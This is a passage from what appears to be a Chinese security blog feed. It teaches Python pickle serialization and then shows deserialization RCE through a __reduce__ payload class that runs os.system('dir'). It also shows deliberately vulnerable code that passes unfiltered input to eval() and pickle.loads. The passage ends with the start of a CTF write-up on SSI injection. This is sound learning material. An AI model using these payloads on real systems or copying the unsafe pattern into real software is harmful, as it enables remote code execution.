18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>load()操作方法可以从字节对象中读取被封装的对象</p></blockquote><p>file文件依旧是<code>.pkl</code>后缀的pkl文件，并且读取也应使用rb权限，因为是二进制文件。</p><h3 id="pickle-dumps"><a href="#pickle-dumps" class="headerlink" title="pickle.dumps()"></a>pickle.dumps()</h3><p><code>pickle.dumps(object)</code></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>dumps()操作方法将object对象序列化并返回一个byte对象，而不是存入到文件中</p></blockquote><h3 id="pickle-loads"><a href="#pickle-loads" class="headerlink" title="pickle.loads()"></a>pickle.loads()</h3><p><code>pickle.loads(bytes_object)</code></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>loads()操作方法从字节对象中读取被封装的对象</p></blockquote><h2 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h2><h3 id="序列化到pkl文件"><a href="#序列化到pkl文件" class="headerlink" title="序列化到pkl文件"></a>序列化到pkl文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A1andNS'</span><span class="token punctuation">,</span> <span class="token string">'Alan'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">]</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>ls<span class="token punctuation">,</span> f<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后在同目录下生成了一个test.pkl文件，这就是完成了一个序列化的操作。pkl文件中的二进制序列化对象，可读型是很差的。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203094913304.png" alt="image-20210203094913304"></p><p>下面我们试着反序列化。</p><h3 id="从pkl文件反序列化"><a href="#从pkl文件反序列化" class="headerlink" title="从pkl文件反序列化"></a>从pkl文件反序列化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.pkl'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>    test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203095509348.png" alt="image-20210203095509348"></p><p>成功反序列化回原来的list类型数据。</p><h2 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h2><h3 id="序列化到二进制字符"><a href="#序列化到二进制字符" class="headerlink" title="序列化到二进制字符"></a>序列化到二进制字符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A1andNS'</span><span class="token punctuation">,</span> <span class="token string">'Alan'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>ls<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果，得到一个byte类型的数据。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203100045526.png" alt="image-20210203100045526"></p><p>我们现在来尝试反序列化：</p><h3 id="二进制字符反序列化"><a href="#二进制字符反序列化" class="headerlink" title="二进制字符反序列化"></a>二进制字符反序列化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x07A1andNS\x94\x8c\x04Alan\x94\x8c\x05Alice\x94e.'</span>    ls <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203100910074.png" alt="image-20210203100910074"></p><p>也可以成功的反序列化回到list类型，但是如果是从外部接收输入会怎么样呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please enter your data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ls <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个问题是input接收的数据是str类型，所以使用eval()来进行自动类型转换，就可以实现数据变成bytes类型了。</p><p>我们从键盘输入二进制数据：</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x07A1andNS\x94\x8c\x04Alan\x94\x8c\x05Alice\x94e.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203112031413.png" alt="image-20210203112031413"></p><p>这样就成功实现了反序列化，但是这里的例子很简单，使用了eval()，而且没有对用户输入做任何过滤，如果这样编写这个程序，就可能会导致一个RCE问题，所以一般情况下input接收的数据是需要进行过滤的。</p><p>例如使用这个语句调用os库的system函数执行系统命令<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203111108684.png" alt="image-20210203111108684"></p><h2 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h2><p>下面来看看Python2环境下的pickle。首先的一个不同就是在py2中序列化后结果是str类型，而不是py3的bytes类型。</p><h3 id="序列化到pkl文件-1"><a href="#序列化到pkl文件-1" class="headerlink" title="序列化到pkl文件"></a>序列化到pkl文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A1andNS'</span><span class="token punctuation">,</span> <span class="token string">'Alan'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">]</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.pkl'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>ls<span class="token punctuation">,</span> f<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里文件权限只要用w就好了，因为str类型的原因，它已经不是一个二进制文件了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204124416450.png" alt="image-20210204124416450"></p><p>这样我们就生成了一个序列化文件test.pkl，下面我们来对这个pkl文件进行反序列化操作。</p><h3 id="从pkl文件反序列化-1"><a href="#从pkl文件反序列化-1" class="headerlink" title="从pkl文件反序列化"></a>从pkl文件反序列化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.pkl'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以对应的读权限也只要使用r就可以了，也是可以成功进行的反序列化的。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204124648035.png" alt="image-20210204124648035"></p><h2 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h2><h3 id="序列化到字符串"><a href="#序列化到字符串" class="headerlink" title="序列化到字符串"></a>序列化到字符串</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A1andNS'</span><span class="token punctuation">,</span> <span class="token string">'Alan'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>ls<span class="token punctuation">)</span>    <span class="token keyword">print</span> data    <span class="token keyword">print</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们可以得到序列化后的str类型数据：</p><pre class="line-numbers language-none"><code class="language-none">(lp0S&#39;A1andNS&#39;p1aS&#39;Alan&#39;p2aS&#39;Alice&#39;p3a.编码后：%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以明显发现python2的序列化结果和python3的序列化结果是不同的，为了方便使用，一般可以会对其进行编码，例如urllib.quote()等</p><h3 id="从字符串反序列化"><a href="#从字符串反序列化" class="headerlink" title="从字符串反序列化"></a>从字符串反序列化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">'%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.'</span>    ls <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204122607667.png" alt="image-20210204122607667"></p><p>成功进行了反序列化操作，回到了原来的list类型。</p><p>同样的那么如果是从键盘接收数据呢，这里在py2下方便了不少，因为input接收的是str类型，刚好pickle序列化后也是str类型，所以就避免了类型转换的问题了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">'please enter your data:'</span><span class="token punctuation">)</span>    ls <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要使用raw_input()函数来接收数据，因为input()在python2中只接受变量作为传入值，非变量内容会报错。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204123657348.png" alt="image-20210204123657348"></p><p>再次成功实现了反序列化操作。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>这里简单介绍一种常用的魔术方法，以下内容使用Python3进行说明</p><h3 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h3><p><code>__reduce__</code>魔术方法上出现反序列化漏洞，和PHP的<code>__wakeup</code>魔术方法类似，都是在反序列化开始或结束时，自动调用这类的函数，并且一般会在内部将解析出来的结构去执行一下，所以可以导致出现RCE等问题。当 <code>__reduce__()</code>函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。</p><p>首先生成一个序列化的bytes变量：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> <span class="token string">'dir'</span>        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>a <span class="token operator">=</span> Payload<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''运行结果'''</span><span class="token string">b'\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们在<code>__reduce__</code>里return了一个二元组<code>(os.system,(cmd,),)</code>，这里最外的可以省略，就变成了脚本中的<code>os.system,(cmd,)</code>，正如前面说的，这里的os.system就是第一个元组参数，即被调用函数。而(cmd,)则是第二个参数，即被调用函数的参数。最后解析结果是os.system(“dir”)。接下来我们对它进行一个反序列化操作，看看<code>__reduce__</code>被触发时，会发生什么。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">def</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please enter your data:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ls <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> ls<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204143623249.png" alt="image-20210204143623249"></p><p>正如我们预计的确实是成功进行了命令执行。但是这里又一个问题必须要注意，os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0 os.popen() 无法读取程序执行的返回值。如果是作为网页后端，os.system和os.popen执行命令只有在配合print时才可以正常输出内容，如何时return与之配合将会没有回显。这时候就可以尝试使用commands.getoutput()函数来进行替换，构造payload去执行命令，用法和os.system和os.popen一样。这里就不演示了，可以去BUUOJ上做一下[CISCN2019 华北赛区 Day1 Web2]iku这题，这题的反序列化就很好的体现了这一点。</p><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><p>[1] <a href="https://xz.aliyun.com/t/2289#toc-2">https://xz.aliyun.com/t/2289#toc-2</a></p><p>[2] <a href="https://zhuanlan.zhihu.com/p/25981037">https://zhuanlan.zhihu.com/p/25981037</a></p><p>[3] <a href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Pyth</summary>
      
    
    
    
    <category term="Python学习" scheme="http://yoursite.com/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
    <category term="pickle" scheme="http://yoursite.com/tags/pickle/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ刷题二月第一周</title>
    <link href="http://yoursite.com/post/BUUOJ%E5%88%B7%E9%A2%98%E4%BA%8C%E6%9C%88%E7%AC%AC%E4%B8%80%E5%91%A8.html"/>
    <id>http://yoursite.com/post/BUUOJ%E5%88%B7%E9%A2%98%E4%BA%8C%E6%9C%88%E7%AC%AC%E4%B8%80%E5%91%A8.html</id>
    <published>2021-02-01T12:31:38.000Z</published>
    <updated>2021-06-28T14:58:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>考点：SSI注入</p><p>直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加密hash，原文位唯一ID+随机字符(xxxxx)</span><span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span> <span class="token comment">//uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token 